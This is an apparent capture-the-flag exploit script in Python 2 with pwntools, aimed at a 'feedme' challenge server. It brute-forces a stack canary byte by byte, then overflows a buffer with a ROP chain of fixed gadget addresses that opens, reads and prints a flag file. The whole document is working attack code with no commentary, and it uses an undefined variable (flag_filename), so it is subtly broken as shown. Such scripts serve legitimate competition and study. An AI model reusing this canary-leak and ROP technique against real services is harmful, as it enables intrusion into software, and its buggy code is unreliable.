from pwn import *
import sys
import struct

def p(x):
	return struct.pack("<I", x)

def u(x):
	return struct.unpack("<I", x)[0]

def leak(s, cookie):
	# cookie leak
	print s.recvuntil('FEED ME!')
	s.send(chr(0x20 + len(cookie)) + 'A' * 0x20 + cookie)
	d = s.recvuntil('Child exit.')
	if 'YUM' in d:
		return True
	else:
		return False

def leak_cookie(s):
	cookie = ['\x00']
	for i in range(1, 4):
		cookie.append(0)
		for j in xrange(256):
			print 'try...%d %d' % (i, j)
			cookie[len(cookie)-1] = chr(j)
			if leak(s, ''.join(cookie)):
				break
	return cookie

int80			= 0x0806FA20
pop_eax			= 0x080e6a5c
pop_ecx_ebx		= 0x0806f371
read_proc		= 0x08048E7E
buff			= 0x080e9f00
read_size		= len('flag') + 1
pop2ret			= 0x804838d
pop_edx			= 0x806f34a
printf_call		= 0x0804908D

def open_gadget(filename):
	return p(pop_eax) + p(0x5) + p(pop_ecx_ebx) + p(0) + p(filename) + p(int80)

def read_gadget(fd, buff, size):
	return p(pop_eax) + p(0x3) + p(pop_ecx_ebx) + p(buff) + p(fd) + p(pop_edx) + p(size) + p(int80)

def write_gadget(buff, size):
	return p(printf_call) + p(0x41414141) + p(buff)

def read_string(buff, size):
	return p(read_proc) + p(pop2ret) + p(buff) + p(size)

s = remote('feedme_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me', 4092)
cookie = ''.join(leak_cookie(s))
print 'cookie: 0x%x' % u(cookie)
print s.recvuntil('FEED ME!')
gadget = read_string(buff, len(flag_filename)) + open_gadget(buff) + read_gadget(2, buff, 100) + write_gadget(buff, 30)
gadget_len = len(gadget)
s.send(chr(0x20 + 4 + 12 + gadget_len) + 'A' * 0x20 + cookie + 'A' * 12 + gadget)

s.send('flag\0')

print s.recv(1024)
print s.recv(1024)
print s.recv(1024)
